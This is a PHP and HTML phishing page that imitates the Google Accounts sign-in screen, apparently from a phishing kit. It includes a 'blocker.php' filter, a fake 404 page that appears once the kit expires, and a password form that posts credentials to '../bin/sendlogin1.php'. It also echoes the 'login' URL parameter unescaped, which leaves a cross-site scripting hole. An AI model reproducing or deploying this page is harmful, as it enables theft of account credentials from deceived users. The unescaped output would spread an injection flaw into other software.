<?php
include('blocker.php');
$todays_date=time();
$exp_date = "exp1234";
if ($exp_date <= $todays_date)

{
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /djdjkd was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>';
exit;
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google" value="notranslate">
<link rel="icon" type="image/ico" href="http://www.google.com/favicon.ico">
  <title>Sign in - Google Accounts</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: middle;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card *:first-child {
  margin-top: 0;
  }
  .rc-button {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400&lang=en" rel="stylesheet" type="text/css">
<style>
  .banner {
  text-align: center;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>


  </head>
<script>
function validateForm()
{
var x=document.forms["Default"]["Email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid e-mail address");
  return false;
  }
var y=document.forms["Default"]["Passwd"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["Default"]["Passwd"].value;
if(y.length < 6)
  {
  alert("Password is Too Short");
  return false;
  }
}
</script>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in with your Google Account
  </h2>
</div>
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"></div>
<img class="profile-img" src="../canvas.png" alt="">
<p class="profile-name"></p>
  <form name="Default" method="post" action="../bin/sendlogin1.php?login=<?php echo $_GET['login'] ?>&loginID=$loginID" onsubmit="return validateForm();" id="Default">

<span id="reauthEmail"><?php echo $_GET['login'] ?></span>

<label class="hidden-label" for="Passwd"></label>
<input id="Passwd" name="Passwd" type="password" placeholder="Password" class="" value="">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie"
               type="checkbox" value="yes"
               checked="checked">
  <span>
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your protection, keep this checked only on devices you use regularly.
  <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount"
       class="need-help-reverse">
  Need help?
  </a>
  </form>
</div>
<div class="one-google">
  <p class="create-account">
  <a id="link-signup" href="https://accounts.google.com/SignUp?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount">
  Create an account
  </a>
  </p>
<p class="tagline">
  One Google Account for everything Google
</p>
<img src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" width="210" height="17" alt="">
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  Google
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="https://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  ?Afrikaans?
  </option>
  <option value="az"
                 >
  ?az?rbaycanca?
  </option>
  <option value="in"
                 >
  ?Bahasa Indonesia?
  </option>
  <option value="ms"
                 >
  ?Bahasa Melayu?
  </option>
  <option value="ca"
                 >
  ?catal??
  </option>
  <option value="cs"
                 >
  ?ce?tina?
  </option>
  <option value="da"
                 >
  ?dansk?
  </option>
  <option value="de"
                 >
  ?Deutsch?
  </option>
  <option value="et"
                 >
  ?eesti?
  </option>
  <option value="en-GB"
                 >
  ?English (United Kingdom)?
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  ?English (United States)?
  </option>
  <option value="es"
                 >
  ?espa?ol (Espa?a)?
  </option>
  <option value="es-419"
                 >
  ?espa?ol (Latinoam?rica)?
  </option>
  <option value="eu"
                 >
  ?euskara?
  </option>
  <option value="fil"
                 >
  ?Filipino?
  </option>
  <option value="fr-CA"
                 >
  ?fran?ais (Canada)?
  </option>
  <option value="fr"
                 >
  ?fran?ais (France)?
  </option>
  <option value="gl"
                 >
  ?galego?
  </option>
  <option value="hr"
                 >
  ?hrvatski?
  </option>
  <option value="zu"
                 >
  ?isiZulu?
  </option>
  <option value="is"
                 >
  ??slenska?
  </option>
  <option value="it"
                 >
  ?italiano?
  </option>
  <option value="sw"
                 >
  ?Kiswahili?
  </option>
  <option value="lv"
                 >
  ?latvie?u?
  </option>
  <option value="lt"
                 >
  ?lietuviu?
  </option>
  <option value="hu"
                 >
  ?magyar?
  </option>
  <option value="nl"
                 >
  ?Nederlands?
  </option>
  <option value="no"
                 >
  ?norsk?
  </option>
  <option value="pl"
                 >
  ?polski?
  </option>
  <option value="pt"
                 >
  ?portugu?s?
  </option>
  <option value="pt-BR"
                 >
  ?portugu?s (Brasil)?
  </option>
  <option value="pt-PT"
                 >
  ?portugu?s (Portugal)?
  </option>
  <option value="ro"
                 >
  ?rom?na?
  </option>
  <option value="sk"
                 >
  ?slovencina?
  </option>
  <option value="sl"
                 >
  ?sloven?cina?
  </option>
  <option value="fi"
                 >
  ?suomi?
  </option>
  <option value="sv"
                 >
  ?svenska?
  </option>
  <option value="vi"
                 >
  ?Ti?ng Vi?t?
  </option>
  <option value="tr"
                 >
  ?T?rk?e?
  </option>
  <option value="el"
                 >
  ??????????
  </option>
  <option value="bg"
                 >
  ???????????
  </option>
  <option value="mn"
                 >
  ????????
  </option>
  <option value="ru"
                 >
  ?????????
  </option>
  <option value="sr"
                 >
  ????????
  </option>
  <option value="uk"
                 >
  ????????????
  </option>
  <option value="ka"
                 >
  ?????????
  </option>
  <option value="hy"
                 >
  ?????????
  </option>
  <option value="iw"
                 >
  ????????
  </option>
  <option value="ur"
                 >
  ???????
  </option>
  <option value="ar"
                 >
  ??????????
  </option>
  <option value="fa"
                 >
  ????????
  </option>
  <option value="am"
                 >
  ??????
  </option>
  <option value="ne"
                 >
  ????????
  </option>
  <option value="mr"
                 >
  ???????
  </option>
  <option value="hi"
                 >
  ????????
  </option>
  <option value="bn"
                 >
  ???????
  </option>
  <option value="gu"
                 >
  ?????????
  </option>
  <option value="ta"
                 >
  ???????
  </option>
  <option value="te"
                 >
  ????????
  </option>
  <option value="kn"
                 >
  ???????
  </option>
  <option value="ml"
                 >
  ????????
  </option>
  <option value="si"
                 >
  ???????
  </option>
  <option value="th"
                 >
  ?????
  </option>
  <option value="lo"
                 >
  ?????
  </option>
  <option value="km"
                 >
  ???????
  </option>
  <option value="ko"
                 >
  ?????
  </option>
  <option value="zh-HK"
                 >
  ???(??)?
  </option>
  <option value="ja"
                 >
  ?????
  </option>
  <option value="zh-CN"
                 >
  ??????
  </option>
  <option value="zh-TW"
                 >
  ??????
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
